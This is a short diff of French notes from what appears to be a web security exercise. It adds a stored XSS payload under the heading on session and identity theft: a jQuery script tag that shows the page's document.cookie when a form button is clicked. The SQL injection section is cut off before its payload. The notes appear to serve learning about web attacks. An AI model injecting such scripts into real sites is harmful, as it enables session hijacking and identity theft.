@@ -7,6 +7,9 @@ A - Modification du texte des commentaires (injection JavaScript)
 B - Vol de session, vol d'identité (vol de cookie)
 --------------------------------------------------
 
+<script>$(function(){ $("form > p:nth-child(5) > input").click(function(){ $("#content").append("<span>COOKIE : '" + document.cookie+"' </span>" ); }); });</script>
+
+
 C - Injections SQL
 -------------------
 1. Je rentre dans le champ password la valeur : 
